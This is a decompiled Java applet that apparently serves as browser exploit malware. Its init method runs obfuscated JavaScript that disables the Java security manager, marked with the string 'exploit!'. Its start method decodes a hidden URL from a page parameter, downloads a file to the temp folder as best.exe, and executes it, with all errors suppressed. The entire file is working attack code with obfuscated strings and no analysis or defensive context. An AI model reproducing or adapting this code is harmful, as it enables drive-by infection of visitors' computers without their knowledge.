import javax.script.ScriptException;
import java.awt.Component;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Efira extends Applet
{
    private JList equius;
    
    private void dhdhs() {
        int a = 3;
        ++a;
    }
    
    @Override
    public void start() {
        try {
            final String uri = this.getParameter("denamstst".replace("namst", ""));
            String duri = "";
            for (int i = 0; i < uri.length(); ++i) {
                int rt = uri.charAt(i);
                rt -= 4;
                duri += (char)rt;
            }
            String tdir = System.getProperty("jnamodestava.inamodesto.tmnamodestpdinamodestr".replace("namodest", ""));
            if (tdir.charAt(tdir.length() - 1) != '\\') {
                tdir += "\\";
            }
            final String sefa = tdir + "best" + ".e".concat("xe");
            final byte[] buher = new byte[1300];
            final InputStream numi = Sefas.adomdel(duri);
            byte[] iopl = new byte[153601];
            int cnt = 0;
            int g6 = 0;
            final FileOutputStream coo = new FileOutputStream(sefa);
            while ((g6 = numi.read(iopl)) > 0) {
                coo.write(iopl, 0, g6);
                iopl = new byte[153601];
                cnt += g6;
            }
            coo.close();
            numi.close();
            try {
                Sefas.exe(sefa);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Boolean nsdh() {
        return true;
    }
    
    @Override
    public void init() {
        try {
            final Eng ent = new Eng();
            final int a = 0;
            final int b = a + 1;
            ent.bers.eval("vueiol2ar erueiol2ror = neueiol2w Erueiol2roueiol2r(\"Mueiol2y eueiol2rrueiol2or\");thueiol2is.ueiol2toSueiol2trinueiol2g = fuueiol2nctiueiol2on(){ jueiol2ava.lueiol2ang.Sueiol2ystueiol2em.seueiol2tSecueiol2uritueiol2yManaueiol2ger(nuueiol2ll);appueiol2let.sueiol2taueiol2rt();retueiol2urn \"ueiol2exueiol2ploueiol2it!\";};eueiol2rroueiol2r.meueiol2ssueiol2age = tueiol2hiueiol2s;".replace("ueiol2", ""));
            final int c = a + b * 2;
            this.equius = new JList((E[])new Object[] { ent.bers.get("erquatroroquatror".replace("quatro", "")) });
            final int d = c + b + 2;
            this.add(this.equius);
        }
        catch (ScriptException ex) {}
    }
}
